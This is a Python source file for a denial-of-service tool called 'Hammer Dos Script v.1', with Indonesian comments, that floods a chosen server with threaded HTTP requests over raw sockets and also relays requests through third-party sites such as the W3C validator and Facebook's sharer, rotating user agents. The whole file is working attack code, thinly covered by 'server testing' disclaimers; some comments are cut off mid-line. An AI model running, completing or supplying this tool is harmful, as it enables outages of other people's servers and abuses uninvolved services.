from queue import Queue
from optparse import OptionParser
import time
import sys
import socket
import threading
import logging
import urllib.request
import random
import signal

def user_agent():
    uagent = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT)",
        "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        # ... tambahkan user-agent lainnya sesuai kebutuhan
    ]
    return uagent
    
def my_bots():
    bots = [
        "http://validator.w3.org/check?uri=",
        "http://www.facebook.com/sharer/sharer.php?u=",
        "http://www.google.com/bot.html",
        "http://www.bing.com/bingbot.htm",
        "http://www.linkedin.com/bots/agent",
        "http://www.twitter.com/robots.txt",
        "http://webmaster.yandex.com/robots.xml",
        # ... tambahkan URL bot lainnya sesuai kebutuhan
    ]
    return bots
    
def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(user_agent())}))
            print("\033[94mbot is hammering...\033[0m")
            time.sleep(0.1)
    except:
        time.sleep(0.1)
        
def down_it(item):
    try:
        while True:
            packet = str("GET / HTTP/1.1\nHost: " + host + "\nUser-Agent: " + random.choice(user_agent()) + "\n" + data).encode()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()), "packet sent!\033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(.1)
    except socket.error as e:
        print("\033[91mno connection! server maybe down\033[0m")
        time.sleep(.1)
        
def dos():
    try:
        while True:
            item = q.get()
            down_it(item)
            q.task_done()
    except Exception as e:
        logging.error("Error in dos(): %s", e)

def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(my_bots()) + "http://" + host)
        w.task_done()
        
def usage():
    print('''
    \033[92mHammer Dos Script v.1
    It is the end user's responsibility to obey all applicable laws.
    It is just for server testing script. Your ip is visible. 
    usage: python3 hammer.py [-s] [-p] [-t]
    -h : help
    -s : server ip
    -p : port default 80
    -t : turbo default 135\033[0m''')
    sys.exit()
    
def get_parameters():
    global host
    global port
    global thr
    global item
    optp = OptionParser(add_help_option=False,epilog="Hitting the server with a large number of requests can cause server performance issues or downtime. Use responsibly.")
    optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s","--server", dest="host",help="set server ip")
    optp.add_option("-p","--port",type="int",dest="port",help="set server port")
    optp.add_option("-t","--turbo",type="int",dest="turbo",help="set turbo")
    optp.add_option("-h","--help",dest="help",action='store_true',help="show this help message and exit")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s [%(asctime)s] %(message)s', datefmt='%H:%M:%S')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 135
    else:
        thr = opts.turbo
                
# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


def main():
    # ...

    try:
        while True:
            for i in range(int(thr)):
                t = threading.Thread(target=dos)
                t.daemon = True  # if thread exists, it>
                t.start()
                t2 = threading.Thread(target=dos2)
                t2.daemon = True  # if thread exists, i>
                t2.start()

            start = time.process_time()

            # tasking
            item = 0
            while True:
                if item > 1800:  # for no memory crash
                    item = 0
                    time.sleep(0.1)
                item += 1
                q.put(item)
                w.put(item)

            # Tidak perlu memanggil down_it(item) di si>

            q.join()
            w.join()
    except KeyboardInterrupt:
        logging.info("Ctrl+C pressed. Exiting gracefully.")
        sys.exit()

# ...

if __name__ == '__main__':
    get_parameters()

    # Configure logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    logging.info(f"Host: {host}, Port: {port}, Turbo: {thr}")
    logging.info("Please wait...")

    user_agent()
    my_bots()
    time.sleep(5)

    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, lambda signum, frame: sys.exit(0))

    main()
